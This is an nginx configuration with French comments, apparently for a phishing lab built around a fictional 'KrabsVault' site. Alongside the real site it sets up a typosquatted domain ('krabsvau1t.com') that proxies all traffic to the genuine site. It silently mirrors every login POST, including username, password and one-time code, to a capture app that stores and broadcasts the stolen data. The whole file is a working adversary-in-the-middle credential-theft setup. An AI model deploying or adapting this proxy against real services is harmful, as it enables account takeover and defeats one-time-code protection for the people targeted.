events {}

http {
  # ── KrabsVault — site légitime (inchangé) ─────────────────────────
  server {
    listen 443 ssl;
    server_name krabsvault.com;

    ssl_certificate     /etc/nginx/certs/krabsvault.com.pem;
    ssl_certificate_key /etc/nginx/certs/krabsvault.com-key.pem;

    location / {
      proxy_pass http://host.containers.internal:8000;
      proxy_http_version 1.1;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
    }
  }

  # ── KrabsVau1t — proxy AitM (le "1" remplace le "l") ──────────────
  server {
    listen 443 ssl;
    server_name krabsvau1t.com;

    ssl_certificate     /etc/nginx/certs/krabsvau1t.com.pem;
    ssl_certificate_key /etc/nginx/certs/krabsvau1t.com-key.pem;

    # Tout le trafic est relayé vers le VRAI krabsvault.
    # → Bob voit le vrai site, les vraies réponses, les vrais cookies.
    #   nginx relaie sessions/cookies/CSRF automatiquement.
    location / {
      proxy_pass http://host.containers.internal:8000;   # vrai krabsvault
      proxy_http_version 1.1;
      proxy_set_header Host krabsvault.com;               # le vrai site se croit sur son domaine
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
    }

    # On intercepte UNIQUEMENT le POST du formulaire de login.
    location = /login {
      # 1) copie silencieuse de la requête vers l'app de capture
      mirror /__capture;
      mirror_request_body on;          # inclure le corps (username/password/otp)

      # 2) la requête réelle continue vers le vrai krabsvault
      proxy_pass http://host.containers.internal:8000/login;
      proxy_http_version 1.1;
      proxy_set_header Host krabsvault.com;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Sous-requête interne invisible : reçoit la copie du POST /login.
    # L'app de capture lit le corps, stocke, broadcast vers /stolen, répond 200.
    location = /__capture {
      internal;
      proxy_pass http://host.containers.internal:8666/capture;
      proxy_set_header Host $host;
      proxy_set_header X-Original-URI $request_uri;
    }
  }
}